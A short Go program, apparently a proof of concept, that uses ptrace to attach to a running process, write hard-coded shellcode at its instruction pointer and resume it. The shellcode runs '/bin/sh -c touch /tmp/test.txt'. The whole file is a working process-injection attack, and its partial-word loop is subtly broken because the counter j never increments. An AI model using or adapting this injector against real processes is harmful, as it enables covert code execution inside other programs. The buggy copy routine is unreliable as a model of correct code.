package main

import (
	"fmt"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)

func AttachProcess(pid int) {
	err := syscall.PtraceAttach(pid)
	fmt.Println("ATTACH: ", err)
}

func GetRegisters(pid int) syscall.PtraceRegs {
	var regs syscall.PtraceRegs
	err := syscall.PtraceGetRegs(pid, &regs)
	fmt.Println("Get Registers: ", err)

	return regs
}

func InjectData(pid int, shellcode []byte, dest uintptr, len int) int {
	i := 0
	for i < len {
		// Read 4 bytes from the source slice as a uint32
		var s uint32
		if i+4 <= len {
			s = *(*uint32)(unsafe.Pointer(&shellcode[i]))
		} else {
			// Handle the case where the remaining bytes are less than 4
			s = 0
			for j := 0; i < len; i++ {
				s |= uint32(shellcode[i]) << (8 * j)
			}
		}
		data := make([]byte, 4)
		// Convert s into a 4-byte slice in little-endian order
		data[0] = byte(s)
		data[1] = byte(s >> 8)
		data[2] = byte(s >> 16)
		data[3] = byte(s >> 24)
		// Use syscall.PtracePokeData to write s into the destination process's memory
		_, err := syscall.PtracePokeText(pid, dest, data)
		fmt.Println("PokeText: ", err)

		// Move to the next 4 bytes
		i += 4
		dest += 4
	}

	return 0
}

func SetRegistry(pid int, reg syscall.PtraceRegs) {
	err := syscall.PtraceSetRegs(pid, &reg)
	fmt.Println("Set Reg: ", err)

}

func main() {
	pid, _ := strconv.Atoi(os.Args[1])
	shellcode := []byte{0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
		0x00, 0x99, 0x50, 0x54, 0x5f, 0x52, 0x66, 0x68, 0x2d, 0x63, 0x54, 0x5e,
		0x52, 0xe8, 0x14, 0x00, 0x00, 0x00, 0x74, 0x6f, 0x75, 0x63, 0x68, 0x20,
		0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x74, 0x65, 0x73, 0x74, 0x2e, 0x74, 0x78,
		0x74, 0x00, 0x56, 0x57, 0x54, 0x5e, 0x6a, 0x3b, 0x58, 0x0f, 0x05}
	AttachProcess(pid)
	regs := GetRegisters(pid)
	InjectData(pid, shellcode, uintptr(regs.Rip), len(shellcode))
	regs.Rip += 2
	SetRegistry(pid, regs)
	syscall.PtraceDetach(pid)

}
